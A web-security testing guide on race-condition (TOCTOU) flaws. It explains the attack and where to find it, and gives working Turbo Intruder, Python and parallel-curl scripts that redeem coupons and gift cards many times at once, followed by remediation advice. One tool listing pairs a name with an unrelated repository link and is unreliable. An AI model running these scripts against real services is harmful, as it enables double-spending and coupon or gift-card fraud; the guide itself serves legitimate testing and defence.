# Race Conditions (TOCTOU)

## Overview
Race conditions in web applications occur when the outcome of an operation depends on the relative timing of concurrent requests, and the application fails to handle simultaneous access to shared state correctly. The most common form is a Time-of-Check to Time-of-Use (TOCTOU) vulnerability: the application checks a condition (e.g., "does the user have enough balance?"), then performs an action (e.g., "deduct the balance") in two separate, non-atomic operations. An attacker sends multiple simultaneous requests that all pass the check before any of them trigger the use/write, resulting in the action being performed multiple times. Race conditions can enable double-spending, gift card reuse, coupon stacking, free-point farming, and limit bypass.

## How It Works
Classic TOCTOU attack flow:

```
Thread 1 (attacker request 1): Check balance (100 points) → PASS
Thread 2 (attacker request 2): Check balance (100 points) → PASS  [before Thread 1 deducts]
Thread 1: Deduct 100 points → balance = 0
Thread 2: Deduct 100 points → balance = -100 (or balance = 0 again if poorly handled)
Thread 1: Fulfil order 1
Thread 2: Fulfil order 2
Result: Attacker gets two orders but only paid for one.
```

Why it works: Web application frameworks often handle each HTTP request in a separate thread or process. Without proper locking (database transactions with `SELECT FOR UPDATE`, Redis locks, etc.), the application's check and update operations are not atomic.

**Limit bypass scenario (coupon):**
1. Application checks: "has this coupon been used?" → No
2. Multiple simultaneous requests all pass the check
3. All requests redeem the coupon
4. Coupon is marked used after the first request completes, but others already passed the check

**Sub-second timing:** Some race conditions require very precise timing — all requests must reach the server within the same few-millisecond window. Burp Suite's Turbo Intruder is ideal for this because it uses HTTP/2 single-packet attacks to synchronize request delivery at the TCP level.

## Impact
- Double-spending: redeeming a gift card, voucher, or wallet balance multiple times.
- Coupon code stacking: using a single-use coupon multiple times.
- Free premium access: winning a race between subscription check and upgrade action.
- Referral fraud: triggering multiple referral bonuses from a single referral action.
- Account limit bypass: creating more resources (API keys, team members, projects) than the plan allows.
- Inventory exhaustion: reserving more stock than available.
- Duplicate loyalty points / reward points.

## Where to Look
- **Coupon/promo code redemption:** any endpoint that validates and marks a code as used.
- **Wallet / balance transactions:** debit, transfer, withdrawal endpoints.
- **Gift card redemption:** apply-to-account flows.
- **Referral bonus crediting:** first-use referral link endpoints.
- **Like/vote/upvote endpoints:** rate limiting often races poorly.
- **Password reset token consumption:** a token should be invalidated on first use.
- **Email/phone verification OTPs:** one-time use tokens.
- **File upload processing:** race between file upload and antivirus/content-type check.
- **Subscription/plan upgrade:** concurrent upgrade requests.
- **API rate limit counters:** concurrent requests may both read the same count before incrementing.
- Endpoints that implement "check → act" logic with any shared state (database, cache, session).

## Testing Steps
1. Identify candidate endpoints that have "one-time" or "limited" actions.
2. Capture the single legitimate request for the target action in Burp Suite.
3. Send it to **Turbo Intruder** for race condition testing.
4. Configure Turbo Intruder to send 20–50 concurrent requests to the same endpoint using the HTTP/2 single-packet attack.
5. Observe responses: if multiple requests succeed (HTTP 200 with a success body), the race condition is confirmed.
6. Verify the side effect: check if the wallet was debited only once but the action happened multiple times, or if a coupon was applied multiple times.
7. Test with different concurrency levels: 5, 10, 20, 50 simultaneous requests.
8. For coupon/token endpoints, first mark the token as used (legitimate use) and immediately — in the same millisecond window — send 30 more redemption requests. Some will succeed before the "used" flag is committed.
9. Try the attack at different times of day (server load affects timing).
10. Test from a network connection close to the server (low latency) for maximum effect.

## Payloads / Techniques

```python
# ===== TURBO INTRUDER SCRIPT (Burp Suite Extension) =====
# Use this in Burp > Right-click request > Extensions > Turbo Intruder > Send to Turbo Intruder
# Paste this script in the script box

# Basic race condition — HTTP/1.1 multi-threaded
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=20,
                            requestsPerConnection=1,
                            pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response.lower():
        table.add(req)


# HTTP/2 Single-Packet Attack (more reliable, bypasses network jitter)
# Requires the target to support HTTP/2
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

```python
# ===== PYTHON RACE CONDITION TEST (threading) =====
import requests
import threading

BASE_URL = "https://target.example.com"
SESSION_COOKIE = "your_session_cookie_value"
COUPON_CODE = "SAVE50"

results = []
lock = threading.Lock()

def redeem_coupon():
    r = requests.post(
        f"{BASE_URL}/api/coupon/redeem",
        json={"code": COUPON_CODE},
        cookies={"session": SESSION_COOKIE}
    )
    with lock:
        results.append((r.status_code, r.json() if r.headers.get('content-type','').startswith('application/json') else r.text[:50]))

# Launch 30 concurrent threads
threads = [threading.Thread(target=redeem_coupon) for _ in range(30)]
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [(s, r) for s, r in results if s == 200]
print(f"Total requests: {len(results)}")
print(f"Success responses (HTTP 200): {len(successes)}")
if len(successes) > 1:
    print(f"[!] RACE CONDITION CONFIRMED: {len(successes)} successful redemptions!")
for s, r in successes:
    print(f"  -> HTTP {s}: {r}")
```

```python
# ===== ASYNCIO RACE TEST (more precise timing) =====
import asyncio
import aiohttp

BASE_URL = "https://target.example.com"
SESSION_COOKIE = "your_session_cookie_value"
NUM_REQUESTS = 30

async def send_request(session, sem):
    async with sem:
        async with session.post(
            f"{BASE_URL}/api/coupon/redeem",
            json={"code": "SAVE50"},
            cookies={"session": SESSION_COOKIE}
        ) as resp:
            body = await resp.text()
            return resp.status, body[:100]

async def main():
    sem = asyncio.Semaphore(NUM_REQUESTS)
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, sem) for _ in range(NUM_REQUESTS)]
        results = await asyncio.gather(*tasks)

    successes = [(s, b) for s, b in results if s == 200 and "success" in b.lower()]
    print(f"Successes: {len(successes)} out of {NUM_REQUESTS}")
    if len(successes) > 1:
        print("[!] RACE CONDITION LIKELY EXPLOITABLE")

asyncio.run(main())
```

```bash
# ===== PARALLEL CURL REQUESTS =====
# Simple shell-based race test using background jobs

SESSION="your_session_cookie_value"

for i in $(seq 1 20); do
  curl -s -X POST https://target.example.com/api/coupon/redeem \
    -H "Content-Type: application/json" \
    -H "Cookie: session=${SESSION}" \
    -d '{"code":"SAVE50"}' &
done
wait
echo "All requests sent"


# ===== TESTING GIFT CARD RACE CONDITION =====
# Balance: $100. Send 50 requests to withdraw $100 simultaneously
for i in $(seq 1 50); do
  curl -s -X POST https://target.example.com/api/wallet/redeem \
    -H "Content-Type: application/json" \
    -H "Cookie: session=${SESSION}" \
    -d '{"gift_card_code":"GIFTCARD123","amount":100}' &
done
wait
```

```http
# Turbo Intruder template request (paste into Turbo Intruder editor)
POST /api/coupon/redeem HTTP/1.1
Host: target.example.com
Content-Type: application/json
Cookie: session=YOUR_SESSION_COOKIE

{"code": "SAVE50"}
```

## Burp Suite Tips
- Install **Turbo Intruder** from the BApp Store — it is the standard tool for race condition testing in Burp. It supports HTTP/2 single-packet attacks which are the most reliable technique.
- Capture the target request in **Proxy History**, right-click → **Extensions > Send to Turbo Intruder**.
- Use the `race_single_packet_attack.py` example script included in Turbo Intruder as your starting template.
- In **Repeater**, group multiple tabs for the same request (Burp Suite Pro: "Create Tab Group") and use "Send group in parallel" to send all simultaneously.
- Use **Repeater > Send group (parallel)** feature in Burp Suite 2023.9+: create 20 tabs with the same request, group them, and hit "Send group (parallel)" for a basic race test without Turbo Intruder.
- Filter **HTTP History** to show only the target endpoint (use the search filter at the top of History) to see which parallel requests received which responses.
- **Comparer**: compare the response body from a successful vs. failed race attempt to understand what "success" looks like in the response.

## Tools
- Burp Suite Pro + Turbo Intruder BApp — https://github.com/PortSwigger/turbo-intruder
- Python threading / asyncio + aiohttp (custom race test scripts)
- Apache JMeter (load testing tool, also useful for race testing)
- Wrk or Vegeta (HTTP benchmarking tools, useful for high-concurrency tests)
- curl with background jobs (shell-based quick tests)
- racepwn — https://github.com/n0mi1k/apidor (race condition tester)

## Remediation
- Implement atomic database operations using proper transaction isolation. For inventory / balance deduction: use `SELECT ... FOR UPDATE` or `UPDATE ... WHERE balance >= amount` in a single atomic statement.
- Use database-level unique constraints or row-level locks to prevent duplicate actions.
- Implement idempotency keys: the client includes a unique key per request; the server rejects duplicate keys within a time window.
- Use distributed locks (Redis SETNX, Redlock) for operations that span multiple services.
- For coupon/token redemption: mark the token as "pending" in the check phase using an atomic compare-and-swap or database UPSERT with a unique constraint on the token + used status.
- Validate and deduct in a single database transaction: `BEGIN; SELECT balance FOR UPDATE; UPDATE balance - amount; COMMIT;`
- Queue sensitive actions (payment, coupon redemption) through a task queue — process them serially per resource to eliminate parallelism.
- For gift cards and one-time tokens: use database unique index on `(token, redeemed_at)` where `redeemed_at` is set atomically in the same UPDATE that processes the redemption.

## References
https://portswigger.net/web-security/race-conditions
https://portswigger.net/research/smashing-the-state-machine
https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html
https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use
https://cwe.mitre.org/data/definitions/362.html
https://github.com/PortSwigger/turbo-intruder
https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py
